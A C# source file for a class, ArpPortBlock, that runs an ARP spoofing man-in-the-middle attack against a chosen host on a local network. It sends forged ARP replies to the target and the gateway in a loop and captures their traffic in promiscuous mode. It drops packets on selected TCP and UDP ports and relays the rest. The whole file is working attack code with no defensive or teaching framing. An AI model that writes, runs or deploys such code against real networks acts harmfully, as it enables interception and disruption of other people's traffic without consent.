using System.Net;
using System.Net.NetworkInformation;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;

namespace SkysNativeMeter;

internal sealed class ArpPortBlock : IDisposable
{
    private readonly string _targetIp;
    private readonly PhysicalAddress _targetMac;
    private readonly string _gatewayIp;
    private readonly LibPcapLiveDevice _device;
    private readonly PhysicalAddress _ourMac;
    private readonly HashSet<int> _blockedPorts;
    private readonly CancellationTokenSource _cts = new();
    private PhysicalAddress _gatewayMac;
    private long _droppedPackets;

    public ArpPortBlock(
        string targetIp,
        string targetMac,
        string gatewayIp,
        string ifaceHint,
        string localIp,
        IEnumerable<int> blockedPorts)
    {
        _targetIp = targetIp;
        _targetMac = NetworkHelper.ParseMac(targetMac);
        _gatewayIp = gatewayIp;
        _device = NetworkHelper.ResolveDevice(ifaceHint, localIp);
        _ourMac = NetworkHelper.GetOurMac(_device);
        _gatewayMac = NetworkHelper.ResolveMac(gatewayIp, PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"));
        _blockedPorts = blockedPorts.Where(p => p > 0 && p <= 65535).ToHashSet();

        if (_blockedPorts.Count == 0)
        {
            throw new InvalidOperationException("No valid ports to block");
        }

        NetworkHelper.EnableIpForwarding(_device.Description);
        NetworkHelper.WarmArp(_targetIp);
        NetworkHelper.WarmArp(_gatewayIp);
        _gatewayMac = NetworkHelper.ResolveMac(_gatewayIp, _gatewayMac);
    }

    public void Run()
    {
        _device.Open(DeviceModes.Promiscuous, 1000);
        _device.Filter = $"ip and host {_targetIp}";

        NetworkHelper.EmitJson(new
        {
            type = "started",
            mode = "portblock",
            ip = _targetIp,
            mac = NetworkHelper.NormalizeMac(_targetMac.ToString()),
            ports = _blockedPorts.OrderBy(p => p).ToArray(),
            engine = "native"
        });

        _device.OnPacketArrival += OnPacket;
        var poisonTask = Task.Run(PoisonLoop, _cts.Token);
        var statsTask = Task.Run(StatsLoop, _cts.Token);

        try
        {
            _device.Capture();
        }
        catch (OperationCanceledException)
        {
            // shutting down
        }
        finally
        {
            _device.OnPacketArrival -= OnPacket;
            try { _device.StopCapture(); } catch { /* ignore */ }
            try { _device.Close(); } catch { /* ignore */ }
            _cts.Cancel();
            Task.WaitAll(new[] { poisonTask, statsTask }, 2000);
        }
    }

    private void PoisonLoop()
    {
        while (!_cts.IsCancellationRequested)
        {
            try
            {
                _gatewayMac = NetworkHelper.ResolveMac(_gatewayIp, _gatewayMac);
                SendArpReply(_targetMac, _targetMac, IPAddress.Parse(_targetIp), _ourMac, IPAddress.Parse(_gatewayIp));
                SendArpReply(_gatewayMac, _gatewayMac, IPAddress.Parse(_gatewayIp), _ourMac, IPAddress.Parse(_targetIp));
            }
            catch
            {
                // continue
            }

            Thread.Sleep(1500);
        }
    }

    private void StatsLoop()
    {
        while (!_cts.IsCancellationRequested)
        {
            Thread.Sleep(5000);
            NetworkHelper.EmitJson(new
            {
                type = "portblock_stats",
                ip = _targetIp,
                mac = NetworkHelper.NormalizeMac(_targetMac.ToString()),
                dropped = Interlocked.Read(ref _droppedPackets)
            });
        }
    }

    private void SendArpReply(
        PhysicalAddress ethDest,
        PhysicalAddress arpTargetHw,
        IPAddress arpTargetProto,
        PhysicalAddress senderHw,
        IPAddress senderProto)
    {
        var arp = new ArpPacket(
            ArpOperation.Response,
            arpTargetHw,
            arpTargetProto,
            senderHw,
            senderProto);

        var eth = new EthernetPacket(ethDest, senderHw, EthernetType.Arp) { PayloadPacket = arp };
        arp.UpdateCalculatedValues();
        eth.UpdateCalculatedValues();
        _device.SendPacket(eth.Bytes);
    }

    private void OnPacket(object? sender, PacketCapture e)
    {
        try
        {
            var raw = e.GetPacket();
            var packet = Packet.ParsePacket(raw.LinkLayerType, raw.Data);
            if (packet is not EthernetPacket eth || eth.PayloadPacket is not IPv4Packet ip)
            {
                return;
            }

            if (ShouldDrop(ip))
            {
                Interlocked.Increment(ref _droppedPackets);
                return;
            }

            var destMac = ip.SourceAddress.ToString() == _targetIp ? _gatewayMac : _targetMac;
            ForwardIp(ip, destMac);
        }
        catch
        {
            // ignore bad packets
        }
    }

    private bool ShouldDrop(IPv4Packet ip)
    {
        var srcIsTarget = ip.SourceAddress.ToString() == _targetIp;
        var dstIsTarget = ip.DestinationAddress.ToString() == _targetIp;
        if (!srcIsTarget && !dstIsTarget)
        {
            return false;
        }

        switch (ip.PayloadPacket)
        {
            case TcpPacket tcp:
                return _blockedPorts.Contains(tcp.SourcePort) || _blockedPorts.Contains(tcp.DestinationPort);
            case UdpPacket udp:
                return _blockedPorts.Contains(udp.SourcePort) || _blockedPorts.Contains(udp.DestinationPort);
            default:
                return false;
        }
    }

    private void ForwardIp(IPv4Packet ip, PhysicalAddress destMac)
    {
        var ipBytes = ip.Bytes;
        if (ipBytes.Length < 20) return;

        var packetBytes = new byte[ipBytes.Length];
        Buffer.BlockCopy(ipBytes, 0, packetBytes, 0, ipBytes.Length);

        var ttl = packetBytes[8];
        if (ttl <= 1) return;

        packetBytes[8] = (byte)(ttl - 1);
        packetBytes[10] = 0;
        packetBytes[11] = 0;

        var checksum = NetworkHelper.CalculateIpChecksum(packetBytes);
        packetBytes[10] = (byte)(checksum >> 8);
        packetBytes[11] = (byte)(checksum & 0xFF);

        var eth = new EthernetPacket(destMac, _ourMac, EthernetType.IPv4) { PayloadData = packetBytes };
        eth.UpdateCalculatedValues();
        _device.SendPacket(eth.Bytes);
    }

    public void Dispose()
    {
        _cts.Cancel();
        try { _device.StopCapture(); } catch { /* ignore */ }
        try { _device.Close(); } catch { /* ignore */ }
    }
}
